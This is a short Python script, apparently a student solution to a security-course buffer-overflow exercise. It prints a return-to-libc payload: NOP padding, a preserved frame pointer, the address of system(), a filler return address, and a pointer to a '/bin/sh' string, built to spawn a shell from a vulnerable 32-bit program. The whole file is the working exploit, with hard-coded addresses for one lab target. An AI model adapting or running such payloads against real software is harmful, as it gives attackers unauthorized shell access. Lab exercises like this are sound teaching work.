#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"\x90"*10) #buffer
sys.stdout.buffer.write(pack("<I",0xfffeb534)) #keep ebp the same
sys.stdout.buffer.write(pack("<I", 0x804fbf0)) # address of system
sys.stdout.buffer.write(b"X"*4) #needed for some reason
sys.stdout.buffer.write(pack("<I", 0xfffeb538)) #overwrite arg with address to /bin/sh
sys.stdout.buffer.write(b"/bin/sh")
